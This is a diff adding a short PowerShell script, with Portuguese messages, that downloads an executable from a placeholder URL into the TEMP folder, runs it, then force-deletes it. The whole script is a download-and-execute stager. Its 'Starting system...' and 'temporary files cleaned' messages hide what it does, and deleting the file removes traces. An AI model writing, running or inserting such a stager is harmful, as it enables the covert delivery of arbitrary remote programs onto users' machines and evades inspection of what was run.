@@ -1,0 +1,7 @@
+$url = "LINK_DIRETO_DO_SEU_EXE_AQUI"
+$temp = "$env:TEMP\ZYPY.exe"
+Write-Host "Iniciando sistema..." -ForegroundColor Cyan
+Invoke-WebRequest -Uri $url -OutFile $temp
+Start-Process $temp -Wait
+Remove-Item $temp -Force
+Write-Host "Sessão finalizada e arquivos temporários limpos." -ForegroundColor Green
